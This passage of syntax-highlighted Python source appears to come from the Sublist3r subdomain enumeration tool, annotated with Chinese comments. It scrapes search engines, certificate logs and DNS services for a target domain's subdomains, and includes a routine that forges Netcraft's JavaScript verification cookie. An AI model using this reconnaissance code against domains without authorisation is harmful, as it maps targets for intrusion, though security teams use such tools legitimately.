class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://www.bing.com/search?q=&#123;query&#125;&amp;go=Submit&amp;first=&#123;page_no&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"Bing"</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">30</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent)</span><br><span class="line">        self.q = q</span><br><span class="line">        self.verbose = verbose</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        links_list = list()</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;li class="b_algo"&gt;&lt;h2&gt;&lt;a href="(.*?)"'</span>)</span><br><span class="line">        link_regx2 = re.compile(<span class="string">'&lt;div class="b_title"&gt;&lt;h2&gt;&lt;a href="(.*?)"'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            links2 = link_regx2.findall(resp)</span><br><span class="line">            links_list = links + links2</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">'&lt;(\/)?strong&gt;|&lt;span.*?&gt;|&lt;|&gt;'</span>, <span class="string">''</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">'http'</span>):</span><br><span class="line">                    link = <span class="string">"http://"</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">'domain:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;'</span></span><br><span class="line">            found = <span class="string">' -'</span>.join(self.subdomains[:self.MAX_DOMAINS])</span><br><span class="line">            query = fmt.format(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">"domain:&#123;domain&#125; -www.&#123;domain&#125;"</span>.format(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaiduEnum</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://www.baidu.com/s?pn=&#123;page_no&#125;&amp;wd=&#123;query&#125;&amp;oq=&#123;query&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"Baidu"</span></span><br><span class="line">        <span class="comment"># 百度也太狠了。。</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">2</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">760</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.querydomain = self.domain</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        links = list()</span><br><span class="line">        found_newdomain = <span class="literal">False</span></span><br><span class="line">        subdomain_list = []</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;a.*?class="c-showurl".*?&gt;(.*?)&lt;/a&gt;'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                link = re.sub(<span class="string">'&lt;.*?&gt;|&gt;|&lt;|&amp;nbsp;'</span>, <span class="string">''</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">'http'</span>):</span><br><span class="line">                    link = <span class="string">"http://"</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain.endswith(self.domain):</span><br><span class="line">                    subdomain_list.append(subdomain)</span><br><span class="line">                    <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                        found_newdomain = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">if</span> self.verbose:</span><br><span class="line">                            self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                        self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_newdomain <span class="keyword">and</span> subdomain_list:</span><br><span class="line">            self.querydomain = self.findsubs(subdomain_list)</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findsubs</span><span class="params">(self, subdomains)</span>:</span></span><br><span class="line">        <span class="comment"># 整个文件唯一用到Counter的地方</span></span><br><span class="line">        <span class="comment"># 这段没看懂</span></span><br><span class="line">        count = Counter(subdomains)</span><br><span class="line">        subdomain1 = max(count, key=count.get)</span><br><span class="line">        count.pop(subdomain1, <span class="string">"None"</span>)</span><br><span class="line">        subdomain2 = max(count, key=count.get) <span class="keyword">if</span> count <span class="keyword">else</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> (subdomain1, subdomain2)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_response_errors</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="comment"># 惊了...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_sleep</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(random.randint(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.subdomains <span class="keyword">and</span> self.querydomain != self.domain:</span><br><span class="line">            found = <span class="string">' -site:'</span>.join(self.querydomain)</span><br><span class="line">            query = <span class="string">"site:&#123;domain&#125; -site:www.&#123;domain&#125; -site:&#123;found&#125; "</span>.format(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">"site:&#123;domain&#125; -site:www.&#123;domain&#125;"</span>.format(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetcraftEnum</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        self.base_url = <span class="string">'https://searchdns.netcraft.com/?restriction=site+ends+with&amp;host=&#123;domain&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"Netcraft"</span></span><br><span class="line">        <span class="comment"># 注意</span></span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        super(NetcraftEnum, self).__init__(self.base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(self, url, cookies=None)</span>:</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        cookies = cookies <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout, cookies=cookies)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_next</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;A href="(.*?)"&gt;&lt;b&gt;Next page&lt;/b&gt;&lt;/a&gt;'</span>)</span><br><span class="line">        link = link_regx.findall(resp)</span><br><span class="line">        link = re.sub(<span class="string">'host=.*?%s'</span> % self.domain, <span class="string">'host=%s'</span> % self.domain, link[<span class="number">0</span>])</span><br><span class="line">        url = <span class="string">'http://searchdns.netcraft.com'</span> + link</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_cookies</span><span class="params">(self, cookie)</span>:</span></span><br><span class="line">        cookies = dict()</span><br><span class="line">        cookies_list = cookie[<span class="number">0</span>:cookie.find(<span class="string">';'</span>)].split(<span class="string">"="</span>)</span><br><span class="line">        cookies[cookies_list[<span class="number">0</span>]] = cookies_list[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># hashlib.sha1 requires utf-8 encoded str</span></span><br><span class="line">        cookies[<span class="string">'netcraft_js_verification_response'</span>] = hashlib.sha1(urllib.unquote(cookies_list[<span class="number">1</span>]).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cookies</span><span class="params">(self, headers)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'set-cookie'</span> <span class="keyword">in</span> headers:</span><br><span class="line">            cookies = self.create_cookies(headers[<span class="string">'set-cookie'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        start_url = self.base_url.format(domain=<span class="string">'example.com'</span>)</span><br><span class="line">        resp = self.req(start_url)</span><br><span class="line">        cookies = self.get_cookies(resp.headers)</span><br><span class="line">        url = self.base_url.format(domain=self.domain)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            resp = self.get_response(self.req(url, cookies))</span><br><span class="line">            self.extract_domains(resp)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Next page'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            url = self.get_next(resp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        links_list = list()</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;a href="http://toolbar.netcraft.com/site_report\?url=(.*)"&gt;'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加了个cstf_token</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DNSdumpster</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://dnsdumpster.com/'</span></span><br><span class="line">        self.live_subdomains = []</span><br><span class="line">        self.engine_name = <span class="string">"DNSdumpster"</span></span><br><span class="line">        self.threads = <span class="number">70</span></span><br><span class="line">        self.lock = threading.BoundedSemaphore(value=self.threads)</span><br><span class="line">        self.q = q</span><br><span class="line">        super(DNSdumpster, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_host</span><span class="params">(self, host)</span>:</span></span><br><span class="line">        <span class="comment"># 查询ip，如果能查出来，说明域名有效</span></span><br><span class="line">        <span class="comment"># 可能是这个查询引擎会查出已经废弃的域名的原因</span></span><br><span class="line">        is_valid = <span class="literal">False</span></span><br><span class="line">        Resolver = dns.resolver.Resolver()</span><br><span class="line">        Resolver.nameservers = [<span class="string">'8.8.8.8'</span>, <span class="string">'8.8.4.4'</span>]</span><br><span class="line">        self.lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = Resolver.query(host, <span class="string">'A'</span>)[<span class="number">0</span>].to_text()</span><br><span class="line">            <span class="keyword">if</span> ip:</span><br><span class="line">                <span class="keyword">if</span> self.verbose:</span><br><span class="line">                    self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, host))</span><br><span class="line">                is_valid = <span class="literal">True</span></span><br><span class="line">                self.live_subdomains.append(host)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        self.lock.release()</span><br><span class="line">        <span class="keyword">return</span> is_valid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(self, req_method, url, params=None)</span>:</span></span><br><span class="line">        params = params <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        headers = dict(self.headers)</span><br><span class="line">        headers[<span class="string">'Referer'</span>] = <span class="string">'https://dnsdumpster.com'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> req_method == <span class="string">'GET'</span>:</span><br><span class="line">                resp = self.session.get(url, headers=headers, timeout=self.timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                resp = self.session.post(url, data=params, headers=headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_csrftoken</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        csrf_regex = re.compile(<span class="string">"&lt;input type='hidden' name='csrfmiddlewaretoken' value='(.*?)' /&gt;"</span>, re.S)</span><br><span class="line">        token = csrf_regex.findall(resp)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> token.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        resp = self.req(<span class="string">'GET'</span>, self.base_url)</span><br><span class="line">        token = self.get_csrftoken(resp)</span><br><span class="line">        params = &#123;<span class="string">'csrfmiddlewaretoken'</span>: token, <span class="string">'targetip'</span>: self.domain&#125;</span><br><span class="line">        post_resp = self.req(<span class="string">'POST'</span>, self.base_url, params)</span><br><span class="line">        self.extract_domains(post_resp)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> self.subdomains:</span><br><span class="line">            t = threading.Thread(target=self.check_host, args=(subdomain,))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">return</span> self.live_subdomains</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        tbl_regex = re.compile(<span class="string">'&lt;a name="hostanchor"&gt;&lt;\/a&gt;Host Records.*?&lt;table.*?&gt;(.*?)&lt;/table&gt;'</span>, re.S)</span><br><span class="line">        link_regex = re.compile(<span class="string">'&lt;td class="col-md-4"&gt;(.*?)&lt;br&gt;'</span>, re.S)</span><br><span class="line">        links = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            results_tbl = tbl_regex.findall(resp)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            results_tbl = <span class="string">''</span></span><br><span class="line">        links_list = link_regex.findall(results_tbl)</span><br><span class="line">        links = list(set(links_list))</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            subdomain = link.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最友好的网站.....</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Virustotal</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://www.virustotal.com/en/domain/&#123;domain&#125;/information/'</span></span><br><span class="line">        self.engine_name = <span class="string">"Virustotal"</span></span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.q = q</span><br><span class="line">        super(Virustotal, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the main send_req need to be rewritten</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_req</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># once the send_req is rewritten we don't need to call this function, the stock one should be ok</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = self.base_url.format(domain=self.domain)</span><br><span class="line">        resp = self.send_req(url)</span><br><span class="line">        self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;div class="enum.*?"&gt;.*?&lt;a target="_blank" href=".*?"&gt;(.*?)&lt;/a&gt;'</span>, re.S)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                subdomain = link.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用起来也挺简单的</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatCrowd</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=&#123;domain&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"ThreatCrowd"</span></span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.q = q</span><br><span class="line">        super(ThreatCrowd, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = self.base_url.format(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = json.loads(resp)[<span class="string">'subdomains'</span>]</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                subdomain = link.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用证书查询</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CrtSearch</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://crt.sh/?q=%25.&#123;domain&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"SSL Certificates"</span></span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.q = q</span><br><span class="line">        super(CrtSearch, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = self.base_url.format(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        <span class="keyword">if</span> resp:</span><br><span class="line">            self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;TD&gt;(.*?)&lt;/TD&gt;'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                subdomain = link.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain) <span class="keyword">or</span> <span class="string">'*'</span> <span class="keyword">in</span> subdomain:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'@'</span> <span class="keyword">in</span> subdomain:</span><br><span class="line">                    subdomain = subdomain[subdomain.find(<span class="string">'@'</span>)+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 大佬自建的dns库</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PassiveDNS</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'https://api.sublist3r.com/search.php?domain=&#123;domain&#125;'</span></span><br><span class="line">        self.engine_name = <span class="string">"PassiveDNS"</span></span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.q = q</span><br><span class="line">        super(PassiveDNS, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = self.base_url.format(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> resp:</span><br><span class="line">            <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">        self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span 